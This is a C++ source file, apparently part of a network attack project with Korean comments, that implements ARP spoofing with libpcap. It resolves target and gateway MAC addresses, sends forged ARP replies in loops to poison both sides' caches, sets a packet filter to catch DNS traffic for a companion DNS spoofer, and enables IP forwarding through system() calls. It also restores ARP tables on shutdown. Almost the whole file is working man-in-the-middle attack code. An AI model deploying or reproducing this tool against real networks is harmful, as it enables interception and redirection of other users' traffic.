#include "arp_spoof.hpp"
#include "network_utils.hpp"
#include "dns_spoof.hpp"  // 필요 시 DNS 스푸핑 호출
#include <iostream>
#include <cstring>
#include <csignal>
#include <unistd.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <cstdlib>

using namespace std;

// SpoofTarget 클래스 구현
SpoofTarget::SpoofTarget(const string& ip_str_) : ip_str(ip_str_), running(false) 
{
    string_to_ip(ip_str_.c_str(), ip);
    memset(mac, 0, 6);
}

SpoofTarget::~SpoofTarget() 
{
    stop_thread();
}

void SpoofTarget::stop_thread() 
{
    if (running && thread_ptr && thread_ptr->joinable()) 
    {
        running = false;
        thread_ptr->join();
    }
}

const u_int8_t* SpoofTarget::get_ip() const {
    return ip;
}

const u_int8_t* SpoofTarget::get_mac() const {
    return mac;
}

const string& SpoofTarget::get_ip_str() const {
    return ip_str;
}

bool SpoofTarget::is_running() const {
    return running;
}

void SpoofTarget::set_mac(const u_int8_t* mac_) {
    memcpy(mac, mac_, 6);
}

// ArpSpoofer 클래스 구현
ArpSpoofer::ArpSpoofer(const string& iface) : interface(iface), handle(nullptr) 
{
    memset(errbuf, 0, PCAP_ERRBUF_SIZE);
    memset(attacker_mac, 0, 6);
    memset(attacker_ip, 0, 4);
    memset(gateway_mac, 0, 6);
    memset(gateway_ip, 0, 4);
}

ArpSpoofer::~ArpSpoofer() 
{
    stop_all();
    if (handle)
        pcap_close(handle);
}

bool ArpSpoofer::initialize() 
{
    handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) 
    {
        cerr << "Failed to open interface: " << errbuf << endl;
        return false;
    }

    if (!get_interface_mac(interface, attacker_mac)) 
    {
        cerr << "Failed to get interface MAC: " << interface << endl;
        return false;
    }
    
    if (!get_interface_ip(interface, attacker_ip)) 
    {
        cerr << "Failed to get interface IP: " << interface << endl;
        return false;
    }
    
    cout << "Interface " << interface << " opened successfully.\n";
    cout << "Interface MAC: " << mac_to_string(attacker_mac) << "\n";
    cout << "Interface IP: " << ip_to_string(attacker_ip) << "\n";
    return true;
}

bool ArpSpoofer::set_gateway(const string& gateway_ip_str_) 
{
    gateway_ip_str = gateway_ip_str_;
    string_to_ip(gateway_ip_str.c_str(), gateway_ip);
    
    cout << "Attacker MAC: " << mac_to_string(attacker_mac) << "\n";
    cout << "Attacker IP: " << ip_to_string(attacker_ip) << "\n";
    cout << "Gateway IP: " << ip_to_string(gateway_ip) << "\n";
    
    if (!get_mac_from_ip(gateway_ip, gateway_mac)) 
    {
        cerr << "Failed to get gateway MAC.\n";
        return false;
    }
    cout << "Gateway MAC: " << mac_to_string(gateway_mac) << "\n";
    return true;
}

bool ArpSpoofer::add_target(const string& target_ip_str) 
{
    auto target = make_unique<SpoofTarget>(target_ip_str);
    u_int8_t target_mac[6];
    if (!get_mac_from_ip(target->get_ip(), target_mac)) 
    {
        cerr << "Failed to get target MAC: " << target_ip_str << "\n";
        return false;
    }
    target->set_mac(target_mac);
    cout << "Added spoof target - IP: " << target_ip_str 
              << ", MAC: " << mac_to_string(target_mac) << "\n";
    lock_guard<std::mutex> lock(mutex);
    targets.push_back(move(target));
    return true;
}

bool ArpSpoofer::get_mac_from_ip(const u_int8_t* target_ip, u_int8_t* target_mac) 
{
    cout << "Searching MAC for IP: " << ip_to_string(target_ip) << "\n";
    u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
    const int MAX_ATTEMPTS = 3;
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) 
    {
        create_arp_packet(packet, attacker_mac, BROADCAST_MAC, attacker_ip, target_ip, 1);
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) 
        {
            cerr << "Packet send failed: " << pcap_geterr(handle) << "\n";
            continue;
        }
        struct pcap_pkthdr header;
        const u_char* packet_data;
        time_t start_time = time(NULL);
        while (time(NULL) - start_time < 10) 
        {
            packet_data = pcap_next(handle, &header);
            if (packet_data == nullptr)
            {   
                continue;
            }
            struct ether_header* eth = (struct ether_header*)packet_data;
            
            if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
            {
                continue;
            }
            
            struct arp_header* arp = (struct arp_header*)(packet_data + sizeof(struct ether_header));
            if (memcmp(arp->spa, target_ip, 4) == 0) 
            {
                memcpy(target_mac, arp->sha, 6);
                cout << "Found MAC: " << mac_to_string(target_mac) << "\n";
                return true;
            }
        }
    }
    return false;
}

// Target의 IP에 해당하는 PACKET만 받아 보기 위해 FILETER 처리 진행
bool ArpSpoofer::update_filter() {
    // Build a more strict filter for DNS packets
    string filter_exp = "((arp or (ip and (udp port 53))) and (host " + ip_to_string(gateway_ip);
    {
        lock_guard<std::mutex> lock(mutex);
        for (const auto& target : targets)
            filter_exp += " or host " + target->get_ip_str();
    }
    filter_exp += "))";
    
    struct bpf_program fp;
    if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) 
    {
        cerr << "Filter compile failed: " << pcap_geterr(handle) << "\n";
        return false;
    }
    if (pcap_setfilter(handle, &fp) == -1) 
    {
        cerr << "Filter set failed: " << pcap_geterr(handle) << "\n";
        return false;
    }
    cout << "Dynamic filter set: " << filter_exp << "\n";
    pcap_freecode(&fp);  // Free the BPF program
    return true;
}

void ArpSpoofer::spoof_target_thread(SpoofTarget* target) 
{
    cout << "Starting periodic spoofing for target " << target->get_ip_str() << "\n";
    while (target->is_running()) 
    {
        send_arp_spoofing_packet(target);
        usleep(100000);
    }
    cout << "Stopping spoofing for target " << target->get_ip_str() << "\n";
}

void ArpSpoofer::send_arp_spoofing_packet(const SpoofTarget* target) 
{
    u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];

    // Target으로 ARP 전달
    create_arp_packet(packet, attacker_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
        cerr << "Failed to send spoof packet to target: " << pcap_geterr(handle) << "\n";
    else
        cout << "Spoof packet sent to target " << target->get_ip_str() << "\n";
    
    // gateway로 ARP전달
    create_arp_packet(packet, attacker_mac, gateway_mac, target->get_ip(), gateway_ip, 2);
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
        cerr << "Failed to send spoof packet to gateway: " << pcap_geterr(handle) << "\n";
    else
        cout << "Spoof packet sent to gateway for target " << target->get_ip_str() << "\n";
}

void ArpSpoofer::start_spoofing_all() 
{
    lock_guard<std::mutex> lock(mutex);
    for (auto& target : targets) 
    {
        if (!target->is_running())
            target->start_thread(&ArpSpoofer::spoof_target_thread, this, target.get());
    }
}

void ArpSpoofer::send_recover_arp_packets() 
{
    cout << "Restoring ARP tables...\n";
    lock_guard<std::mutex> lock(mutex);

    for (auto& target : targets) 
    {
        u_int8_t gateway_recov_packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
        create_arp_packet(gateway_recov_packet, target->get_mac(), gateway_mac, target->get_ip(), gateway_ip, 2);
        if (pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet)) != 0)
        {
            cerr << "Failed to send recovery packet to gateway: " << pcap_geterr(handle) << "\n";
        }
        else
        {
            cout << "Recovery packet sent to gateway: " << target->get_ip_str() << " -> " << ip_to_string(gateway_ip) << "\n";
        }
            
        u_int8_t packet2[sizeof(struct ether_header) + sizeof(struct arp_header)];
        create_arp_packet(packet2, gateway_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);

        if (pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0)
        {
            cerr << "Failed to send recovery packet to target: " << pcap_geterr(handle) << "\n";
        }
        else
        {
            cout << "Recovery packet sent to target: " << ip_to_string(gateway_ip) << " -> " << target->get_ip_str() << "\n";
        }
        for (int i = 0; i < 3; i++) 
        {
            pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet));
            pcap_sendpacket(handle, packet2, sizeof(packet2));
            usleep(100000);
        }
    }
}

void ArpSpoofer::stop_all() 
{
    cout << "Stopping all spoofing...\n";
    send_recover_arp_packets();
    lock_guard<std::mutex> lock(mutex);
    for (auto& target : targets)
    {
        target->stop_thread();
    }
    cout << "All spoofing threads stopped.\n";
}

bool ArpSpoofer::enable_ip_forwarding() 
{
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    cout << "Enabled IP forwarding.\n";
    return true;
}

bool ArpSpoofer::disable_ip_forwarding()
{
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
    cout << "Disabled IP forwarding.\n";
    return true;
}
